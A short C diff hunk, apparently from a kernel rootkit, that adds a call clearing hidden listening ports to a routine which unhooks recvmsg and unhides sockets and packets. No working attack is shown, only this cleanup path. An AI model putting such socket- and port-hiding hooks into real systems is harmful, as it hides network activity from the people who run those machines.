@@ -96,6 +96,7 @@ unhide_sockets(void)
         sys_recvmsg = NULL;
 
         unhide_packets();
+        clear_hidden_lports();
     }
 }
 
